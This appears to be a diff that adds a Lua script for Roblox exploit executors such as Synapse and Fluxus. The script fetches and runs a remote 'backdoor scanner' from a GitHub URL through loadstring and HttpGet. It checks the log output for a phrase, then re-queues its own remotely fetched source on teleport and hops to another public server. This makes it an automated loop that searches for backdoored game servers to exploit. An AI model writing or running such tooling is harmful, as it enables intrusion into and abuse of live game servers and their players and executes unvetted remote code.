@@ -1,0 +1,98 @@
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakad1" -- URL to THIS script
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+
+    local success_text = "]===] .. success_text .. [===[" 
+    local script_url = "]===] .. script_url .. [===[" 
+    local self_url = "]===] .. self_url .. [===[" 
+    local found_success = false
+
+    local function serverHop()
+        local queue = (syn and syn.queue_on_teleport)
+                    or (queue_on_teleport)
+                    or (fluxus and fluxus.queue_on_teleport)
+
+        if queue then
+            local ok, src = pcall(function()
+                return game:HttpGet(self_url)
+            end)
+            if ok and src then
+                queue(src)
+            else
+                warn("Failed to fetch self for queue.")
+            end
+        end
+
+        local function tryHop()
+            local s, res = pcall(function()
+                -- Sort by Descending or use a random cursor to find smaller/different servers
+                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
+                local b = game:HttpGet(url)
+                return HttpService:JSONDecode(b)
+            end)
+
+            if s and res and res.data then
+                local servers = res.data
+                -- Shuffle the table briefly to avoid hitting the same "Failed" server repeatedly
+                for i = #servers, 2, -1 do
+                    local j = math.random(i)
+                    servers[i], servers[j] = servers[j], servers[i]
+                end
+
+                for _, v in pairs(servers) do
+                    if v.playing < v.maxPlayers and v.id ~= game.JobId then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id)
+                        return true
+                    end
+                end
+            end
+            return false
+        end
+
+        local success = false
+        local attempts = 0
+        while not success and attempts < 5 do
+            attempts = attempts + 1
+            success = tryHop()
+            if not success then
+                warn("Server list fetch failed or no servers found. Attempt: " .. attempts)
+                task.wait(2) -- Wait 2 seconds before retrying to avoid API spam
+            end
+        end
+    end
+
+    local connection
+    connection = LogService.MessageOut:Connect(function(message)
+        if string.find(message:lower(), success_text:lower(), 1, true) then
+            found_success = true
+        end
+    end)
+
+    print("Executing loadstring...")
+    local run_success, err = pcall(function()
+        loadstring(game:HttpGet(script_url))()
+    end)
+
+    if not run_success then
+        warn("Loadstring failed: " .. tostring(err))
+    end
+
+    task.wait(0.5)
+    connection:Disconnect()
+
+    if found_success then
+        print("Success detected! Hopping...")
+        serverHop()
+    else
+        print("Phrase not found. Staying in server.")
+    end
+]===]
+
+loadstring(FinalScript)()
